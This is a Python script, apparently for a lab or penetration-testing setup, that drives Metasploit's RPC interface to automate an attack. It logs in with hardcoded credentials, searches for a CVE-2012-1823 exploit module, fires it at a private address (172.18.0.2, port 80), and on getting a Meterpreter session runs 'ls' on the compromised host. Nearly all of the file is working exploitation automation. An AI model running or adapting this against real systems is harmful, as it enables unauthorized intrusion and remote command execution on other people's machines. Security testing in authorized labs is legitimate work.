from base64 import decode
import http.client
import copy, msgpack, time
import re

class metasploit:
    def __init__(self, host , port):
        self.host = host
        self.port = port
        self.conn = http.client.HTTPConnection(self.host, self.port)
        self.authenticated = False
        self.token = False

    def call(self, meth, option):
        option = copy.deepcopy(option)
        if meth != 'auth.login' and self.authenticated == False:
            raise Exception("msf rpc not auth")
        
        # 第二个参数是 token，第一个参数是命令，后面几个是每个命令需要的选项
        if meth != 'auth.login':
            option.insert(0, self.token) 
        option.insert(0, meth)

        resp = self.sendhttprequest(option)
        return msgpack.unpackb(resp.read())
    
    def sendhttprequest(self, str__):
        params = msgpack.packb(str__)
        try:
            self.conn.request("POST", "/api/", params, {"Content-type": "binary/message-pack"} )
            resp = self.conn.getresponse()
        except:
            raise Exception("request time out")
        return resp

    def login(self, user, password):
        ret = self.call('auth.login', [user, password]) 
        
        # ret = {b'result': b'success', b'token': b'TEMPbtn95VcC2LmeZLpKLVQuF5EXST3I'}
        
        if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret.get(b'token')
                print("this session token is :" + str(self.token))
                return True
        else:
            print('auth failed')
            exit(1)
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                print('MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            print('Failed: auth.logout')
            exit(1)

    def get_console(self):
        ret = self.call('console.create', [])

        # ret = {b'id': b'0', b'prompt': b'', b'busy': False}

        self.console_id = ret.get(b'id')
        _ = self.call('console.read', [self.console_id])

    def send_command(self, console_id, command, visualization):
        result = None
        while True:
            _ = self.call('console.write', [console_id, command])
            time.sleep(1)
            ret = self.call('console.read', [console_id])
            time.sleep(1)
            try:
                result = ret.get(b'data').decode('utf-8')
                if result != '':
                    if visualization:
                        print('Result of "{}":\n{}'.format(command, result))
                    break
                
            except:
                    raise Exception("send command  failed ")
                

        return result

    def get_job_list(self):
        jobs = self.call('job.list', [])
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            print('Failed: job.list.')
            return []

    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        for i in range(0,30):
            job_id_list = self.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
        self.call('job.stop', [str(job_id)])
        print('Timeout: job_id={}, uuid={}'.format(job_id, uuid))
        return False

    def get_module_options(self, module_type, module_name):
        options = self.call('module.options', [module_type, module_name])
        key_list = options.keys()
        option = {}
        for key in key_list:
            sub_option = {}
            sub_key_list = options[key].keys()
            for sub_key in sub_key_list:
                if isinstance(options[key][sub_key], list):
                    end_option = []
                    for end_key in options[key][sub_key]:
                        end_option.append(end_key.decode('utf-8'))
                    sub_option[sub_key.decode('utf-8')] = end_option
                else:
                    end_option = {}
                    if isinstance(options[key][sub_key], bytes):
                        sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                    else:
                        sub_option[sub_key.decode('utf-8')] = options[key][sub_key]
            # User specify.
            sub_option['user_specify'] = ""
            option[key.decode('utf-8')] = sub_option
        return option
    
    def set_module_options(self, ip, port, options):
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    # If "user_specify" is not null, set "user_specify" value to the key.
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'
        option['RHOSTS'] = ip
        option['RPORT'] = port
        return option
    
    def execute_module(self, exploit_name, option):
        ret = self.call('module.execute', ['exploit', exploit_name, option])
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid
        except Exception as e:
            raise Exception( 'Failed: module.execute.')


if __name__=='__main__':
    x = metasploit('192.168.71.131', 55553)
    x.login('user','pass123')
    x.get_console()

    # x.call('console.write', [x.console_id, 'search CVE-2012-1823\n'])
    # x.call('console.read', [x.console_id])

    text = x.send_command(x.console_id, "search CVE-2012-1823\n", False)
    print("search finished")
    
    try:
        pattern = r'exploit/[^ ]+'
        exploit = re.findall(pattern, text)[0] # 仅考虑 use 0
        x.send_command(x.console_id, "use " + exploit + '\n', False)
    except:
        raise Exception("can not find exploit")
    print("Using ::" + exploit)
    
    # get options

    option = x.get_module_options('exploit', exploit)
    print("raw options:" + str(option) + "\n\n")

    # set options
    option = x.set_module_options('172.18.0.2', 80, option)

    print("specify options: " + str(option) + '\n\n')

    # execute exploits
    job_id, uuid = x.execute_module(exploit, option)

    if uuid is not None:
        # Check status of running module.
        x.check_running_module(job_id, uuid)
        sessions = x.call('session.list', [])
        key_list = sessions.keys()
        if len(key_list) != 0:
            # Probably successfully of exploitation (but unsettled).
            for key in key_list:
                exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                if uuid == exploit_uuid:
                    # Successfully of exploitation.
                    session_id = int(key)
                    print("session conn succeess !! id is " + str(session_id))
                    x.call('session.meterpreter_write', [session_id, "ls\n"])
                    for i in range(0,30):
                        res = x.call('session.meterpreter_read', [session_id])
                        if res[b'data'] != b'':
                            print(res)
                            x.call('session.stop', [session_id])
                            break
                        time.sleep(1)
                    else:
                        raise Exception("command timeout")
    x.logout()